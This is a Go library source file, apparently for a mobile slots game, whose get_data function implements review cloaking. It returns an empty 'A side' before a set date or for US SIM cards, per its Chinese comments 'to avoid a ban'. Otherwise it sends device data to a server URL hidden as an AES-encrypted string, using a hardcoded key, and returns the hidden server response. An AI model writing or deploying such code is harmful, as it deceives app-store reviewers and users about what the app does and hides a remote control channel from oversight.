package main

import "C"
import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

type MyData struct {
	Name  string `json:"name"`
	Email string `json:"email"`
}

var kk = []byte("41285367890174956739012382148901")

//export get_data
func get_data(input *C.char) *C.char {
	goInput := C.GoString(input)
	// url := "http://game-fiverr-slots.oss-ap-southeast-3.aliyuncs.com/config.json" // 替换为你要请求的 JSON 文件地址
	// url := goInput
	// url2 := C.GoString(url)
	// return input

	var goArray []string
	err := json.Unmarshal([]byte(goInput), &goArray)
	if err != nil {
		fmt.Println("Error parsing JSON:", err)
		return C.CString("")
	}

	// 比较时间
	fixedTime := time.Date(2023, time.August, 29, 0, 0, 0, 0, time.UTC)
	currentTime := time.Now()
	if currentTime.Before(fixedTime) {
		fmt.Println("返回 时间没到")
		return C.CString("")
	}

	// sim卡判断 直接就A面，以免封
	if len(goArray) > 0 && strings.ToUpper(goArray[0]) == "US" {
		return C.CString("")
	}

	//归因去服务端判断吧 客户端这里主要用时间和sim卡判断 不然客户要搜索下载
	// // 归因判断 直接就A面，以免封
	// if len(goArray) > 4 && len(goArray[3]) > 0 && goArray[3] == "utm_source=google-play&utm_medium=organic" {
	// 	return C.CString("")
	// }

	// 将 goArray 转换为 JSON 字符串
	requestData, err := json.Marshal(goArray)
	if err != nil {
		// 处理 JSON 编码错误...
	}

	response, err := http.Post(C.GoString(decrypt(C.CString("vqrGl6kBCp0owOdjPj6uZpgDgRkaU8ZdT+tFfQg9cAK7V0ZVCfcOxIzKvUD6gyqPlBI="))), "application/json", bytes.NewBuffer(requestData))
	// response, err := http.Get(goInput)
	if err != nil {
		fmt.Println("HTTP GET request error:", err)
		// return C.CString("请求出错--")
		return C.CString("")
	}
	defer response.Body.Close()

	// 读取响应的 JSON 数据
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		// return C.CString("相应出错--")
		return C.CString("")
	}

	if len(body) <= 0 {
		return C.CString("")
	}

	fmt.Println(string(body))

	return C.CString(string(body))
}

//export encrypt
func encrypt(plainText *C.char) *C.char {
	block, err := aes.NewCipher(kk)
	if err != nil {
		fmt.Println("Error creating AES cipher:", err)
		return nil
	}

	goPlainText := C.GoString(plainText)
	plainTextBytes := []byte(goPlainText)

	ciphertext := make([]byte, aes.BlockSize+len(plainTextBytes))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println("Error generating IV:", err)
		return nil
	}
	cfbEncrypter := cipher.NewCFBEncrypter(block, iv)
	cfbEncrypter.XORKeyStream(ciphertext[aes.BlockSize:], plainTextBytes)

	decodedBytes := base64.StdEncoding.EncodeToString(ciphertext)

	return C.CString(string(decodedBytes))
}

//export decrypt
func decrypt(ciphertext *C.char) *C.char {
	block, err := aes.NewCipher(kk)
	if err != nil {
		fmt.Println("Error creating AES cipher:", err)
		return nil
	}

	goCiphertext := C.GoString(ciphertext)

	decodeStr, _ := base64.StdEncoding.DecodeString(goCiphertext)

	ciphertextBytes := []byte(decodeStr)

	iv := ciphertextBytes[:aes.BlockSize]
	cfbDecrypter := cipher.NewCFBDecrypter(block, iv)
	decryptedText := make([]byte, len(ciphertextBytes)-aes.BlockSize)
	cfbDecrypter.XORKeyStream(decryptedText, ciphertextBytes[aes.BlockSize:])

	return C.CString(string(decryptedText))
}

func main() {
	// fmt.Println(add(1, 4))
	// fmt.Println(get_data(C.CString("http://game-fiverr-slots.oss-ap-southeast-3.aliyuncs.com/config.json")))
	// var a = "将 Go 字符串转换为 jstring 返回"
	// encryptStr := encrypt(C.CString(a))
	// fmt.Println("加密 --- : ", C.GoString(encryptStr))
	// decodeStr, _ := base64.StdEncoding.DecodeString(C.GoString(encryptStr))
	// fmt.Println("解密--- : ", C.GoString(decrypt(encryptStr)))
	// get_data(C.CString("[]"))
}
